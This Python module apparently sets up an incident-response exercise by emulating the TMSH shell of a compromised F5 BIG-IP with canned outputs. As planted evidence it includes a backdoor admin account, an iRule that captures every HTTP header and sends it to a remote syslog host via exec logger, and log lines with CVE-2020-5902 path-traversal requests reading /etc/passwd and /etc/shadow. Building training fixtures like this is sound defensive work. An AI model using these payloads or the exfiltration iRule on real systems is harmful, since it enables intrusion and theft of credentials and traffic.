"""F5 BIG-IP 14.1.0 TMSH grammar + canned outputs for BIG-IP-DC-01.

Background: the device was compromised via the well-known
CVE-2020-5902 TMUI authenticated-RCE-via-path-traversal (the
`/tmui/login.jsp/..;/tmui/...` family). Once in, the attacker
created a backdoor admin via ``tmsh create auth user`` and added
an iRule to the production virtual server that mirrors HTTP
headers to a remote syslog at their staging IP.

The shell engine's per-device hooks adapt prompt + auth banner to
F5 conventions.
"""

from __future__ import annotations

import sys

HOSTNAME = "bigip-01"

BANNER = """Last login: Wed May 14 18:23:11 2026 from 10.10.0.50

"""

AUTH_BANNER = ""
AUTH_USERNAME_PROMPT = "{hostname} login: "
AUTH_PASSWORD_PROMPT = "Password: "

# F5 TMSH prompt — the full real one is
# `root@(bigip-01)(cfg-sync Standalone)(Active)(/Common)(tmos)#` which
# is overkill for our use; we render the trailing `(tmos)# ` part.
PROMPT_SUFFIXES = {"user": "(tmos)# "}


# ---------------------------------------------------------------------------
# Canned outputs
# ---------------------------------------------------------------------------

SHOW_SYS_VERSION = """Sys::Version
Main Package
  Product     BIG-IP
  Version     14.1.0
  Build       0.0.140
  Edition     Final
  Date        Mon May  6 22:31:34 PDT 2019
"""

SHOW_SYS_HARDWARE = """Sys::Hardware
Platform
  Name                 BIG-IP 2200S
  BIOS Revision        F5 Platform: C112 BIOS 13.0.0 Build 0.0.0
  Base MAC             00:01:d7:00:00:01
"""

LIST_AUTH_USER = """auth user admin {
    description "Admin User"
    encrypted-password $6$xxx...redacted
    partition-access {
        all-partitions {
            role admin
        }
    }
    shell tmsh
}
auth user noc-readonly {
    description "NMS read-only"
    encrypted-password $6$xxx...redacted
    partition-access {
        all-partitions {
            role guest
        }
    }
    shell none
}
auth user REDACTED {
    description ""
    encrypted-password $6$xxx...redacted
    partition-access {
        all-partitions {
            role admin
        }
    }
    shell bash
}
"""

LIST_LTM_VIRTUAL = """ltm virtual REDACTED {
    destination 10.10.0.80:443
    ip-protocol tcp
    mask 255.255.255.255
    pool pool_prod
    profiles {
        clientssl-prod { }
        http { }
        tcp { }
    }
    rules {
        ir_request_log
        REDACTED
    }
    source 0.0.0.0/0
    source-address-translation { type automap }
}
ltm virtual vs_internal_80 {
    destination 10.10.0.81:80
    ip-protocol tcp
    pool pool_internal
    profiles { http { } tcp { } }
}
"""

LIST_LTM_RULE = """ltm rule ir_request_log {
    when HTTP_REQUEST {
        log local0. "[HTTP] [IP::client_addr] [HTTP::uri]"
    }
}
ltm rule REDACTED {
    when HTTP_REQUEST {
        set h ""
        foreach name [HTTP::header names] {
            append h "$name: [HTTP::header value $name]\\n"
        }
        log local0.alert "EXFIL:: [b64encode $h]"
        # forward to remote syslog
        catch { exec /bin/logger -n 198.51.100.221 -P 514 -t exfil "$h" } err
    }
}
"""

SHOW_SYS_LOG_AUDIT = """Sys::Logging
01070417:5: AUDIT - user admin - RAW: /var/log/audit
2026-05-14T22:14:08-07:00 bigip-01 notice mcpd[7521]: 01070417:5: AUDIT - user admin - transaction #1 - object 0 - operation MODIFY - module CLI - status OK
2026-05-14T22:14:55-07:00 bigip-01 notice mcpd[7521]: 01070417:5: AUDIT - user admin - command: tmsh create auth user REDACTED partition-access add { all-partitions { role admin } } password ***
2026-05-14T22:16:11-07:00 bigip-01 notice mcpd[7521]: 01070417:5: AUDIT - user REDACTED - command: tmsh create ltm rule REDACTED { ... }
2026-05-14T22:17:02-07:00 bigip-01 notice mcpd[7521]: 01070417:5: AUDIT - user REDACTED - command: tmsh modify ltm virtual REDACTED rules add { REDACTED }
"""

SHOW_HTTPD_LOG = """10.10.0.50 - admin [14/May/2026:22:08:31 -0700] "GET /tmui/login.jsp HTTP/1.1" 200 4218 "-" "Mozilla/5.0"
REDACTED - - [14/May/2026:22:09:08 -0700] "GET /tmui/login.jsp/..;/tmui/locallb/workspace/REDACTED?fileName=/etc/passwd HTTP/1.1" 200 1832 "-" "python-requests/2.31.0"
REDACTED - - [14/May/2026:22:09:11 -0700] "GET /tmui/login.jsp/..;/tmui/locallb/workspace/REDACTED?fileName=/etc/shadow HTTP/1.1" 200 4422 "-" "python-requests/2.31.0"
REDACTED - - [14/May/2026:22:09:14 -0700] "GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user HTTP/1.1" 200 988  "-" "python-requests/2.31.0"
REDACTED - - [14/May/2026:22:11:08 -0700] "POST /mgmt/tm/auth/user HTTP/1.1" 200 421 "-" "python-requests/2.31.0"
REDACTED - admin [14/May/2026:22:13:55 -0700] "POST /mgmt/tm/util/bash HTTP/1.1" 200 88 "-" "python-requests/2.31.0"
"""

LIST_SYS_MGMT_ROUTE = """sys management-route default {
    gateway 10.10.0.254
    network default
}
sys management-route exfil-route {
    gateway 192.0.2.17
    network REDACTED
}
"""


# ---------------------------------------------------------------------------
# Handlers
# ---------------------------------------------------------------------------

def _show_sys_version(shell, args):
    return SHOW_SYS_VERSION


def _show_sys_hardware(shell, args):
    return SHOW_SYS_HARDWARE


def _list_auth_user(shell, args):
    return LIST_AUTH_USER


def _list_ltm_virtual(shell, args):
    return LIST_LTM_VIRTUAL


def _list_ltm_rule(shell, args):
    return LIST_LTM_RULE


def _show_sys_log_audit(shell, args):
    return SHOW_SYS_LOG_AUDIT


def _list_sys_management_route(shell, args):
    return LIST_SYS_MGMT_ROUTE


def _show_httpd_log(shell, args):
    # Synthetic — real F5 surfaces this under /var/log/restjavad-audit.0.log
    # and /var/log/httpd/httpd_errors and similar; we expose it inline.
    return SHOW_HTTPD_LOG


def _exit(shell, args):
    sys.stdout.write("\n")
    raise SystemExit


def _bash(shell, args):
    return "% bash escape disabled for this exercise.\n"


# ---------------------------------------------------------------------------
# Grammar
# ---------------------------------------------------------------------------

GRAMMAR = {
    "show": {
        "/sys": {
            "version": {"fn": _show_sys_version},
            "hardware": {"fn": _show_sys_hardware},
            "log": {
                "audit": {"fn": _show_sys_log_audit},
            },
        },
        # synthetic IR-style command
        "httpd-log": {"fn": _show_httpd_log},
    },
    "list": {
        "/auth": {"user": {"fn": _list_auth_user}},
        "/ltm": {
            "virtual": {"fn": _list_ltm_virtual},
            "rule": {"fn": _list_ltm_rule},
        },
        "/sys": {
            "management-route": {"fn": _list_sys_management_route},
        },
    },
    "bash": {"fn": _bash},
    "exit": {"fn": _exit},
    "quit": {"fn": _exit},
    "logout": {"fn": _exit},
}
